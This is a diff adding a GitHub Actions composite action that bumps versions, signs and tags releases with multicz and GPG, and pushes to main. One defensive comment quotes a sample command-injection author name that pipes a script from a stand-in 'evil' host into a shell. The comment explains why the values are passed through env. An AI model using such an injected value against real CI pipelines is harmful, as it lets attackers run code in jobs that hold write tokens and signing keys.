@@ -1,0 +1,138 @@
+# SPDX-License-Identifier: MIT
+# Copyright (c) 2026 Chris <goabonga@pm.me>
+
+name: cut release
+description: |
+  multicz bumps cmd/<dir>/version.go, writes changelogs, creates the release
+  commit and per-component tags, and pushes back to main. Artifact
+  distribution is handled by the `publish` job.
+
+  REQUIRES the calling job to have run `actions/checkout` with
+  `fetch-depth: 0`, `persist-credentials: true` and a token that bypasses
+  the main-protection ruleset (RELEASE_PAT).
+
+inputs:
+  gpg-private-key:
+    required: false
+    default: ""
+    description: |
+      secrets.GPG_PRIVATE_KEY from the calling workflow - a composite
+      action can't read the secrets context itself.
+  gpg-passphrase:
+    required: false
+    default: ""
+    description: secrets.GPG_PASSPHRASE from the calling workflow.
+
+outputs:
+  no_bumps:
+    value: ${{ steps.bump.outputs.no_bumps }}
+  bumped:
+    value: ${{ steps.bump.outputs.bumped }}
+  bumped_json:
+    value: ${{ steps.bump.outputs.bumped_json }}
+  gpg_available:
+    value: ${{ steps.gpg.outputs.available }}
+
+runs:
+  using: composite
+  steps:
+    - uses: actions/setup-go@v7
+      with:
+        go-version-file: go.mod
+        cache: true
+    - uses: astral-sh/setup-uv@c18668ad3cf93ea998bef934396af7bb5c839dc7 # v10.2.0
+      with:
+        enable-cache: false
+        python-version: "3.12"
+    # multicz-go-deps-plugin's affects() hook (see [plugins.go-deps] in
+    # multicz.toml) is also consulted by the bump plan computed below, not
+    # just `multicz changed` - both need the same plugin installed.
+    - name: Install multicz
+      shell: bash
+      run: uv tool install multicz --with multicz-go-deps-plugin
+    # The author name and email arrive through `env:`, never interpolated
+    # into the script body. `${{ }}` is substituted before bash sees the
+    # line, so a commit authored as `x"; curl evil|sh; #` would execute in a
+    # job holding contents:write and the GPG key. Anyone able to land a
+    # commit on main controls this string.
+    - name: Configure git author
+      shell: bash
+      env:
+        AUTHOR_NAME: ${{ github.event.head_commit.author.name }}
+        AUTHOR_EMAIL: ${{ github.event.head_commit.author.email }}
+      run: |
+        git config user.name  "${AUTHOR_NAME:-github-actions[bot]}"
+        git config user.email "${AUTHOR_EMAIL:-41898282+github-actions[bot]@users.noreply.github.com}"
+    - name: Detect GPG availability
+      id: gpg
+      shell: bash
+      env:
+        GPG_PRIVATE_KEY: ${{ inputs.gpg-private-key }}
+        GPG_PASSPHRASE: ${{ inputs.gpg-passphrase }}
+      run: |
+        if [ -n "$GPG_PRIVATE_KEY" ] && [ -n "$GPG_PASSPHRASE" ]; then
+          echo "available=true" >> "$GITHUB_OUTPUT"
+        else
+          echo "available=false" >> "$GITHUB_OUTPUT"
+        fi
+    - name: Import and unlock GPG key
+      if: steps.gpg.outputs.available == 'true'
+      shell: bash
+      env:
+        GPG_PRIVATE_KEY: ${{ inputs.gpg-private-key }}
+        GPG_PASSPHRASE: ${{ inputs.gpg-passphrase }}
+      run: |
+        echo "$GPG_PRIVATE_KEY" | gpg --batch --import
+        echo test | gpg --batch --yes --passphrase "$GPG_PASSPHRASE" \
+          --pinentry-mode loopback --sign > /dev/null
+        KEY_ID=$(gpg --list-secret-keys --with-colons \
+          | awk -F: '/^sec/{print $5; exit}')
+        git config user.signingkey "$KEY_ID"
+    # Gate the bump on a non-empty plan. Without this the bump step runs on
+    # every main push and has to be treated as "succeeded with no output",
+    # which hides real failures behind the same empty-output signature.
+    - name: Plan release
+      id: plan
+      shell: bash
+      run: |
+        set -euo pipefail
+        multicz plan \
+          --summary "$GITHUB_STEP_SUMMARY" --output json > /tmp/plan.json
+        if [ "$(jq '.bumps | length' /tmp/plan.json)" = "0" ]; then
+          echo "release=false" >> "$GITHUB_OUTPUT"
+          echo "no bumps pending"
+        else
+          echo "release=true" >> "$GITHUB_OUTPUT"
+        fi
+    - name: Bump, commit, tag, push
+      id: bump
+      if: steps.plan.outputs.release == 'true'
+      shell: bash
+      run: |
+        set -euo pipefail
+        args=(bump --commit --tag --push
+              --summary "$GITHUB_STEP_SUMMARY" --output json)
+        # --sign covers both the release commit and the tags. Omitted rather
+        # than passed false when no key is configured: the flag never
+        # disables signing, so there is no negative form to pass.
+        if [ "${{ steps.gpg.outputs.available }}" = "true" ]; then
+          args+=(--sign)
+        fi
+        multicz "${args[@]}" | tee /tmp/bump.raw
+        # multicz interleaves `post_bump: go mod tidy` progress lines on
+        # stdout BEFORE the final JSON object, so the raw output is not
+        # parseable as-is. Drop everything preceding the document's opening
+        # brace, then assert the remainder really is JSON - an empty
+        # `bumped` reads exactly like "nothing to release" downstream and
+        # would silently skip publish + docs.
+        sed -n '/^{/,$p' /tmp/bump.raw > /tmp/bump.json
+        jq -e . /tmp/bump.json > /dev/null
+        BUMPED=$(jq -r '.bumps | keys | join(" ")' /tmp/bump.json)
+        BUMPED_JSON=$(jq -c '.bumps | keys' /tmp/bump.json)
+        echo "bumped=$BUMPED" >> "$GITHUB_OUTPUT"
+        echo "bumped_json=$BUMPED_JSON" >> "$GITHUB_OUTPUT"
+        if [ -z "$BUMPED" ]; then
+          echo "no_bumps=true" >> "$GITHUB_OUTPUT"
+        else
+          echo "no_bumps=false" >> "$GITHUB_OUTPUT"
+        fi
